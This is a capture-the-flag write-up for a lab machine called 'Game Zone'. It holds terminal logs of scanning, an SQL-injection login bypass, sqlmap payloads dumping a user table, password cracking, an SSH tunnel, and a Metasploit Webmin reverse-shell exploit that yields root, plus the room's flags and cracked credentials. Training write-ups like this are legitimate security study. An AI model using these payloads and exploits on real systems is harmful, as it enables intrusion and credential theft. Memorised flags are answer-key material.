# Game Zone

~~~
# 1 What is the name of the large cartoon avatar holding a sniper on the forum? Agent 47
# 2 When you've logged in, what page do you get redirected to? portal.php
# 3 In the users table, what is the hashed password? ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
# 4 What was the username associated with the hashed password? agent47
# 5 What was the other table name? post
# 6 What is the de-hashed password? videogamer124 
# 7 What is the user flag? 649ac17b1480ac13ef1e4fa579dac95c
# 8 How many TCP sockets are running? 5
# 9 What is the name of the exposed CMS? webmin
#10 What is the CMS version? 1.580
#11 What is the root flag? a4b945830144bdd71908d12d902adeee
~~~

EXPORT IP=10.10.156.38

# Nmap

~~~
sudo nmap -sC -sV -oN nmap/initial 10.10.156.38 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-25 12:01 BST
Nmap scan report for 10.10.156.38
Host is up (0.030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Game Zone
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.32 seconds
zsh: segmentation fault  sudo nmap -sC -sV -oN nmap/initial 10.10.156.38 -Pn

~~~

# Gobuster

~~~
gobuster dir -u http://$IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py -z

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.156.38
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              py,php,sh,txt,cgi,html,js,css
[+] Timeout:                 10s
===============================================================
2022/09/25 12:05:03 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 4502]
/images               (Status: 301) [Size: 313] [--> http://10.10.156.38/images/]
/portal.php           (Status: 302) [Size: 0] [--> index.php]                    
/style.css            (Status: 200) [Size: 7026]                                 
~~~

# Website

~~~
If we have our username as admin and our password as: ' or 1=1 -- - it will insert this into the query and authenticate our session.

Login with ' or 1=1 -- - aand a blank password
~~~

# Nikito

~~~
nikto -h http://$IP | tee nikto.log
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.156.38
+ Target Hostname:    10.10.156.38
+ Target Port:        80
+ Start Time:         2022-09-25 12:13:01 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2022-09-25 12:18:00 (GMT1) (299 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

~~~

# SQLMap 

~~~
Intercept with burpe suit after logging in on the search bar, aand save to file for SQLMap

sqlmap -r request.txt --dbms=mysql --dump
-r uses the intercepted request you saved earlier
--dbms tells SQLMap what type of database management system it is
--dump attempts to outputs the entire database

┌──(sloppy㉿kali)-[~/Downloads/Gamezone]
└─$ sqlmap -r burpe.txt --dbms=mysql --dump 
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.9#stable}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:11:58 /2022-09-25/

[14:11:58] [INFO] parsing HTTP request from 'burpe.txt'
[14:11:58] [INFO] testing connection to the target URL
[14:11:58] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:11:58] [INFO] testing if the target URL content is stable
[14:11:59] [INFO] target URL content is stable
[14:11:59] [INFO] testing if POST parameter 'searchitem' is dynamic
[14:11:59] [WARNING] POST parameter 'searchitem' does not appear to be dynamic
[14:11:59] [INFO] heuristic (basic) test shows that POST parameter 'searchitem' might be injectable (possible DBMS: 'MySQL')
[14:11:59] [INFO] heuristic (XSS) test shows that POST parameter 'searchitem' might be vulnerable to cross-site scripting (XSS) attacks
[14:11:59] [INFO] testing for SQL injection on POST parameter 'searchitem'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[14:12:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:12:02] [WARNING] reflective value(s) found and filtering out
[14:12:02] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[14:12:03] [INFO] testing 'Generic inline queries'
[14:12:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[14:12:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[14:12:07] [INFO] POST parameter 'searchitem' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --string="is")                                                                           
[14:12:07] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                                                                                                 
[14:12:07] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[14:12:07] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[14:12:07] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[14:12:07] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[14:12:07] [INFO] POST parameter 'searchitem' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable                                                                                   
[14:12:07] [INFO] testing 'MySQL inline queries'
[14:12:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[14:12:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[14:12:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[14:12:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[14:12:07] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[14:12:07] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[14:12:07] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[14:12:18] [INFO] POST parameter 'searchitem' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[14:12:18] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[14:12:18] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[14:12:18] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[14:12:18] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[14:12:18] [INFO] target URL appears to have 3 columns in query
[14:12:18] [INFO] POST parameter 'searchitem' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[14:12:18] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
---
Parameter: searchitem (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchitem=-5160' OR 3556=3556#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: searchitem=test' AND GTID_SUBSET(CONCAT(0x7178626b71,(SELECT (ELT(7969=7969,1))),0x716a7a6271),7969)-- JKpO

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchitem=test' AND (SELECT 3765 FROM (SELECT(SLEEP(5)))NSTR)-- ORdE

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: searchitem=test' UNION ALL SELECT NULL,NULL,CONCAT(0x7178626b71,0x4976576f614b6e67486e647654516e454a594f745068514675746749434a59614e634f7769766349,0x716a7a6271)#
---
[14:12:51] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[14:12:52] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[14:12:52] [INFO] fetching current database
[14:12:52] [INFO] fetching tables for database: 'db'
[14:12:52] [INFO] fetching columns for table 'post' in database 'db'
[14:12:52] [INFO] fetching entries for table 'post' in database 'db'
Database: db
Table: post
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                            |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

[14:12:52] [INFO] table 'db.post' dumped to CSV file '/home/sloppy/.local/share/sqlmap/output/10.10.156.38/dump/db/post.csv'                                                                                                            
[14:12:52] [INFO] fetching columns for table 'users' in database 'db'
[14:12:52] [INFO] fetching entries for table 'users' in database 'db'
[14:12:52] [INFO] recognized possible password hashes in column 'pwd'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[14:12:58] [INFO] writing hashes to a temporary file '/tmp/sqlmap34rqps3a51092/sqlmaphashes-eaz82zjp.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[14:13:04] [INFO] using hash method 'sha256_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 
[14:13:11] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] y
[14:13:15] [INFO] starting dictionary-based cracking (sha256_generic_passwd)
[14:13:15] [INFO] starting 8 processes 
[14:13:19] [INFO] using suffix                                                                            
[14:15:51] [WARNING] no clear password(s) found                                                                    
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

[14:15:51] [INFO] table 'db.users' dumped to CSV file '/home/sloppy/.local/share/sqlmap/output/10.10.156.38/dump/db/users.csv'                                                                                                          
[14:15:51] [INFO] fetched data logged to text files under '/home/sloppy/.local/share/sqlmap/output/10.10.156.38'

[*] ending @ 14:15:51 /2022-09-25/

~~~

# John the Ripper cracking pasasword

~~~
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-SHA256
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=8
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
videogamer124    (?)     
1g 0:00:00:00 DONE (2022-09-25 14:20) 5.555g/s 16748Kp/s 16748Kc/s 16748KC/s vimivi..tyler913
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed. 

hash.txt - contains a list of your hashes (in your case its just 1 hash)
--wordlist - is the wordlist you're using to find the dehashed value
--format - is the hashing algorithm used. In our case its hashed using SHA256.
~~~

# SSH (now that we have usernamae and password)

~~~
ssh agent47@10.10.156.38               
The authenticity of host '10.10.156.38 (10.10.156.38)' can't be established.
ED25519 key fingerprint is SHA256:CyJgMM67uFKDbNbKyUM0DexcI+LWun63SGLfBvqQcLA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.156.38' (ED25519) to the list of known hosts.
agent47@10.10.156.38's password: 
Permission denied, please try again.
agent47@10.10.156.38's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$ 
agent47@gamezone:~$ whoami
agent47
agent47@gamezone:~$ ls
user.txt
agent47@gamezone:~$ cat user.txt
649ac17b1480ac13ef1e4fa579dac95c
agent47@gamezone:~$ 
~~~

# Exposing servies with reverse SSH tunnels
~~~
Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

-L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 user@example.com. Going to localhost:9000 on your machine, will load imgur traffic using your other server.

-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.

We will use a tool called ss to investigate sockets running on a host.

If we run ss -tulpn it will tell us what socket connections are running

ss -tulpn
Netid  State      Recv-Q Send-Q          Local Address:Port                         Peer Address:Port              
udp    UNCONN     0      0                           *:68                                      *:*                  
udp    UNCONN     0      0                           *:10000                                   *:*                  
tcp    LISTEN     0      128                         *:10000                                   *:*                  
tcp    LISTEN     0      128                         *:22                                      *:*                  
tcp    LISTEN     0      80                  127.0.0.1:3306                                    *:*                  
tcp    LISTEN     0      128                        :::80                                     :::*                  
tcp    LISTEN     0      128                        :::22                                     :::*   

We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!

From our local machine, run ssh -L 10000:localhost:10000 <username>@<ip>

Once complete, in your browser type "localhost:10000" and you can access the newly-exposed webserver.


ssh -L 10000:localhost:10000 agent47@10.10.156.38
agent47@10.10.156.38's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Sun Sep 25 08:22:06 2022 from 10.18.91.23
agent47@gamezone:~$ 
~~~

# Root flag (Metasploit)

~~~
msf5 > search CVE-2012-2982

Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/unix/webapp/webmin_show_cgi_exec  2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution

msf5 > use 0
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > show options

Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   yes       Webmin Password
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     10000            yes       The target port (TCP)
   SSL       true             yes       Use SSL
   USERNAME                   yes       Webmin Username
   VHOST                      no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin 1.580

msf5 exploit(unix/webapp/webmin_show_cgi_exec) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > set ssl false
[!] Changing the SSL option's value may require changing RPORT!
ssl => false
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > set rpot 10000
rpot => 10000
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > set username agent47
username => agent47
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > set password videogamer124
password => videogamer124
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > set lhost 10.8.50.72
lhost => 10.8.50.72

msf5 exploit(unix/webapp/webmin_show_cgi_exec) > exploit 

[*] Started reverse TCP double handler on 10.8.50.72:4444 
[*] Attempting to login...
[+] Authentication successfully
[+] Authentication successfully
[*] Attempting to execute the payload...
[+] Payload executed successfully
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo wwkNQ0H13ZRfhiYE;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "wwkNQ0H13ZRfhiYE\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (10.8.50.72:4444 -> 10.10.60.68:32784) at 2020-06-08 19:59:09 +0200


pwd
/usr/share/webmin/file/
whoami
root
cat /root/root.txt
a4b945830144bdd71908d12d902adeee
~~~
